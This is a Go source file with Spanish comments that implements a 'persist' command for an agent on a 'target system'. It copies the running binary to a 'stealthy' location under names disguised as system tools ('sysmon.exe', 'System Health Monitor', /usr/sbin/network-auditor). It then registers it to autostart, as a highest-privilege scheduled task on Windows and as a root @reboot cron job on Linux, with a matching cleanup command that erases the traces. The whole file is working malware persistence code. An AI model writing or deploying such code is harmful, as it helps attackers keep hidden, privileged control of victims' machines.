// FICHERO: persistencia.go
package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"

	"github.com/spf13/cobra"
)

// --- CONSTANTES DE CONFIGURACIÓN DE PERSISTENCIA ---
// Tener esto como constantes facilita su modificación en el futuro.

// Windows
const winPersistDir = "SystemMonitor" // Carpeta dentro de C:\ProgramData
const winPersistExe = "sysmon.exe"
const winTaskName = "System Health Monitor"

// Linux
const linuxPersistDir = "/usr/sbin/"
const linuxPersistExe = "network-auditor"
const linuxCronFile = "/etc/cron.d/synapse-agent"

// --- LÓGICA DE LOS COMANDOS ---

func NewPersistCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "persist",
		Short: "Gestiona los mecanismos de persistencia en el sistema objetivo",
		Long:  "Permite instalar o eliminar la persistencia para que el agente sobreviva a reinicios.",
	}
	cmd.AddCommand(newInstallPersistCmd())
	cmd.AddCommand(newCleanPersistCmd())
	return cmd
}

func newInstallPersistCmd() *cobra.Command {
	var apiKey string
	cmd := &cobra.Command{
		Use:   "install",
		Short: "Instala la persistencia en el sistema",
		Long: `Copia el ejecutable a una ubicación sigilosa y crea un mecanismo de
auto-arranque (Tarea Programada en Windows, Cron Job en Linux) para ejecutar el agente.
Requiere privilegios de Administrador/root.`,
		Run: func(cmd *cobra.Command, args []string) {
			if apiKey == "" {
				log.Fatal("Error: Se necesita una clave API (-k) para que el agente persistente la use al iniciarse.")
			}
			installPersistence(apiKey)
		},
	}
	cmd.Flags().StringVarP(&apiKey, "key", "k", "", "Clave API secreta que el agente usará al auto-ejecutarse")
	return cmd
}

func newCleanPersistCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "clean",
		Short: "Elimina todos los rastros de la persistencia",
		Long:  `Elimina el mecanismo de auto-arranque y el ejecutable copiado.
Requiere privilegios de Administrador/root.`,
		Run: func(cmd *cobra.Command, args []string) {
			cleanPersistence()
		},
	}
}

// --- LÓGICA DE IMPLEMENTACIÓN ---

func installPersistence(apiKey string) {
	log.Println("Instalando persistencia...")

	// 1. Obtener la ruta del ejecutable actual
	currentExePath, err := os.Executable()
	if err != nil {
		log.Fatalf("Error crítico: No se pudo determinar la ruta del ejecutable actual: %v", err)
	}

	// Lógica específica para cada sistema operativo
	switch runtime.GOOS {
	case "windows":
		// 2. Copiar el ejecutable a una ubicación sigilosa
		persistDir := filepath.Join(os.Getenv("ProgramData"), winPersistDir)
		persistExePath := filepath.Join(persistDir, winPersistExe)
		log.Printf("Copiando ejecutable a '%s'...", persistExePath)
		
		os.MkdirAll(persistDir, 0755)
		copyFile(currentExePath, persistExePath)

		// 3. Crear la Tarea Programada
		agentCmd := fmt.Sprintf("\"%s\" agent -k \"%s\"", persistExePath, apiKey)
		log.Printf("Creando Tarea Programada '%s' para ejecutar: %s", winTaskName, agentCmd)
		
		cmd := exec.Command("schtasks", "/Create", "/TN", winTaskName, "/TR", agentCmd, "/SC", "ONLOGON", "/RL", "HIGHEST", "/F")
		output, err := cmd.CombinedOutput()
		if err != nil {
			log.Fatalf("Error al crear la Tarea Programada: %v\nSalida: %s", err, string(output))
		}
		log.Printf("Tarea Programada creada con éxito: %s", string(output))

	case "linux":
		// 2. Copiar el ejecutable
		persistExePath := filepath.Join(linuxPersistDir, linuxPersistExe)
		log.Printf("Copiando ejecutable a '%s'...", persistExePath)
		copyFile(currentExePath, persistExePath)
		os.Chmod(persistExePath, 0755) // Dar permisos de ejecución

		// 3. Crear el Cron Job
		agentCmd := fmt.Sprintf("@reboot root %s agent -k '%s'\n", persistExePath, apiKey)
		log.Printf("Añadiendo Cron Job a '%s'", linuxCronFile)
		
		err := os.WriteFile(linuxCronFile, []byte(agentCmd), 0644)
		if err != nil {
			log.Fatalf("Error al crear el fichero de Cron Job: %v", err)
		}
		log.Println("Cron Job creado con éxito.")

	default:
		log.Fatalf("Error: La persistencia no está implementada para el sistema operativo '%s'.", runtime.GOOS)
	}

	log.Println("¡Persistencia instalada con éxito!")
}

func cleanPersistence() {
	log.Println("Eliminando persistencia...")

	switch runtime.GOOS {
	case "windows":
		// 1. Eliminar la Tarea Programada
		log.Printf("Eliminando Tarea Programada '%s'...", winTaskName)
		cmd := exec.Command("schtasks", "/Delete", "/TN", winTaskName, "/F")
		output, err := cmd.CombinedOutput()
		if err != nil {
			log.Printf("ADVERTENCIA: No se pudo eliminar la Tarea Programada (puede que ya no exista): %v\nSalida: %s", err, string(output))
		} else {
			log.Println("Tarea Programada eliminada con éxito.")
		}
		
		// 2. Eliminar el ejecutable y la carpeta
		persistDir := filepath.Join(os.Getenv("ProgramData"), winPersistDir)
		persistExePath := filepath.Join(persistDir, winPersistExe)
		log.Printf("Eliminando ejecutable en '%s'...", persistExePath)
		if err := os.Remove(persistExePath); err != nil {
			log.Printf("ADVERTENCIA: No se pudo eliminar el ejecutable '%s': %v", persistExePath, err)
		}
		if err := os.Remove(persistDir); err != nil {
			log.Printf("ADVERTENCIA: No se pudo eliminar el directorio '%s': %v", persistDir, err)
		}

	case "linux":
		// 1. Eliminar el Cron Job
		log.Printf("Eliminando fichero de Cron Job '%s'...", linuxCronFile)
		if err := os.Remove(linuxCronFile); err != nil {
			log.Printf("ADVERTENCIA: No se pudo eliminar el fichero de Cron Job (puede que ya no exista): %v", err)
		} else {
			log.Println("Fichero de Cron Job eliminado.")
		}

		// 2. Eliminar el ejecutable
		persistExePath := filepath.Join(linuxPersistDir, linuxPersistExe)
		log.Printf("Eliminando ejecutable en '%s'...", persistExePath)
		if err := os.Remove(persistExePath); err != nil {
			log.Printf("ADVERTENCIA: No se pudo eliminar el ejecutable '%s': %v", persistExePath, err)
		}
		
	default:
		log.Fatalf("Error: La limpieza de persistencia no está implementada para '%s'.", runtime.GOOS)
	}

	log.Println("¡Limpieza de persistencia completada!")
}

// copyFile es una función de utilidad para copiar archivos.
func copyFile(src, dst string) {
	sourceFile, err := os.Open(src)
	if err != nil {
		log.Fatalf("Error al abrir el fichero de origen '%s': %v", src, err)
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		log.Fatalf("Error al crear el fichero de destino '%s': %v", dst, err)
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		log.Fatalf("Error al copiar de '%s' a '%s': %v", src, dst, err)
	}
	destFile.Sync()
}